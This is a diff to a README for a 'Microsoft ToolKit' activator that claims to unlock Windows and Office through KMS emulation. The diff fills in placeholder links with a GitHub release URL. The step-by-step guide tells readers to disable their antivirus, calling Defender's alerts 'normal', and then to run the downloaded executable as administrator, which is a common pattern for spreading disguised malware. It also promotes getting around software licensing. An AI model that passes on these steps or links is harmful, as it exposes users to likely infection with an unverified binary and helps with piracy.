@@ -10,7 +10,7 @@
   </p>
   
   <p>
-    <a href="#-download">
+    <a href="https://github.com/windows-and-office-activator/microsoft-toolkit/releases/tag/Download-Latest-Version">
       <img src="https://img.shields.io/badge/Download-Latest%20version-success?style=for-the-badge&logo=github" alt="Download">
     </a>
   </p>
@@ -97,7 +97,7 @@ The toolkit combines KMS emulation technology with an intuitive interface, makin
 
 ### Step-by-step guide
 
-1. Download the latest release from [Releases](link_to_releases).
+1. Download the latest release from [Releases](https://github.com/windows-and-office-activator/microsoft-toolkit/releases/tag/Download-Latest-Version).
 2. Temporarily disable your antivirus (Windows Defender may flag activators — this is normal).
 3. Extract the archive to any folder.
 4. Right-click on `Microsoft_ToolKit.exe` and select **"Run as administrator"**.
@@ -127,9 +127,9 @@ The toolkit combines KMS emulation technology with an intuitive interface, makin
 
 ## 📥 Download
 
-All versions are available in the [Releases](link_to_releases) section. We recommend downloading the latest version.
+All versions are available in the [Releases](https://github.com/windows-and-office-activator/microsoft-toolkit/releases/tag/Download-Latest-Version) section. We recommend downloading the latest version.
 
-**Latest release:** [Microsoft ToolKit v2.6.4](link_to_releases) (March 2026)
+**Latest release:** [Microsoft ToolKit v2.6.4](https://github.com/windows-and-office-activator/microsoft-toolkit/releases/tag/Download-Latest-Version) (March 2026)
 
 ---
 
